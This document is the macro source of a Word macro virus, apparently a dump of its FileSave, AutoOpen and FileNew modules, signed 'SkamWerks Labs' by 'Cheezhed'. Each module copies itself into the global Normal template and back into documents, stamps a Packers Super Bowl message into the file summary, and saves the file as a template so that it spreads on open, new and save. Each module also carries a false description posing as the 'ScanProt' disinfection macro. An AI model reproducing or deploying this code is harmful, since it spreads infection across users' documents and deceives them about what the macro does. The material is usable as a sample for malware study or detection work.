   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSave"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
   Dim FName$
   Dim MacName$

   Rem
   Rem
   Rem SkamWerks Labs Presents the Victory is ours. Created by Cheezhed

   On Error GoTo -1: On Error GoTo ErrorHandler

        WordBasic.FileSummaryInfo Subject:="Green Bay Packers -- Super Bowl XXXI Champions"

        FName$ = WordBasic.[FileName$]()
        MacName$ = FName$ + ":AutoOpen"

        WordBasic.MacroCopy MacName$, "Global:AutoOpen"
        WordBasic.MacroCopy MacName$, "Global:FileNew"
        WordBasic.MacroCopy MacName$, "Global:FileSave"

   ErrorHandler:

   On Error GoTo -1: On Error GoTo AutoOpenHandler
        MacName$ = FName$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:AutoOpen", MacName$
   AutoOpenHandler:

   On Error GoTo -1: On Error GoTo FileNewHandler
        MacName$ = FName$ + ":FileNew"
        WordBasic.MacroCopy "Global:FileNew", MacName$
   FileNewHandler:

   On Error GoTo -1: On Error GoTo FileSaveHandler
        MacName$ = FName$ + ":FileSave"
        WordBasic.MacroCopy "Global:FileSave", MacName$
   FileSaveHandler:

   WordBasic.FileSaveAs Format:=1

   Rem Go Pack Go!

   On Error GoTo -1: On Error GoTo 0:
   On Error GoTo -1: On Error GoTo EndCode:



   EndCode:

   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim FName$
   Dim MacName$

   Rem
   Rem
   Rem SkamWerks Labs Presents the Victory is ours. Created by Cheezhed

   On Error GoTo -1: On Error GoTo ErrorHandler

        WordBasic.FileSummaryInfo Subject:="Green Bay Packers -- Super Bowl XXXI Champions"

        FName$ = WordBasic.[FileName$]()
        MacName$ = FName$ + ":AutoOpen"

        WordBasic.MacroCopy MacName$, "Global:AutoOpen"
        WordBasic.MacroCopy MacName$, "Global:FileNew"
        WordBasic.MacroCopy MacName$, "Global:FileSave"

   ErrorHandler:

   On Error GoTo -1: On Error GoTo AutoOpenHandler
        MacName$ = FName$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:AutoOpen", MacName$
   AutoOpenHandler:

   On Error GoTo -1: On Error GoTo FileNewHandler
        MacName$ = FName$ + ":FileNew"
        WordBasic.MacroCopy "Global:FileNew", MacName$
   FileNewHandler:

   On Error GoTo -1: On Error GoTo FileSaveHandler
        MacName$ = FName$ + ":FileSave"
        WordBasic.MacroCopy "Global:FileSave", MacName$
   FileSaveHandler:

   WordBasic.FileSaveAs Format:=1

   Rem Go Pack Go!

   On Error GoTo -1: On Error GoTo 0:
   On Error GoTo -1: On Error GoTo EndCode:



   EndCode:

   End Sub

   Attribute VB_Name = "FileNew"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileNew.MAIN"
   Dim FName$
   Dim MacName$

   Rem
   Rem
   Rem SkamWerks Labs Presents the Victory is ours. Created by Cheezhed

   On Error GoTo -1: On Error GoTo ErrorHandler

        WordBasic.FileSummaryInfo Subject:="Green Bay Packers -- Super Bowl XXXI Champions"

        FName$ = WordBasic.[FileName$]()
        MacName$ = FName$ + ":AutoOpen"

        WordBasic.MacroCopy MacName$, "Global:AutoOpen"
        WordBasic.MacroCopy MacName$, "Global:FileNew"
        WordBasic.MacroCopy MacName$, "Global:FileSave"

   ErrorHandler:

   On Error GoTo -1: On Error GoTo AutoOpenHandler
        MacName$ = FName$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:AutoOpen", MacName$
   AutoOpenHandler:

   On Error GoTo -1: On Error GoTo FileNewHandler
        MacName$ = FName$ + ":FileNew"
        WordBasic.MacroCopy "Global:FileNew", MacName$
   FileNewHandler:

   On Error GoTo -1: On Error GoTo FileSaveHandler
        MacName$ = FName$ + ":FileSave"
        WordBasic.MacroCopy "Global:FileSave", MacName$
   FileSaveHandler:

   WordBasic.FileSaveAs Format:=1

   Rem Go Pack Go!

   On Error GoTo -1: On Error GoTo 0:
   On Error GoTo -1: On Error GoTo EndCode:



   EndCode:

   End Sub
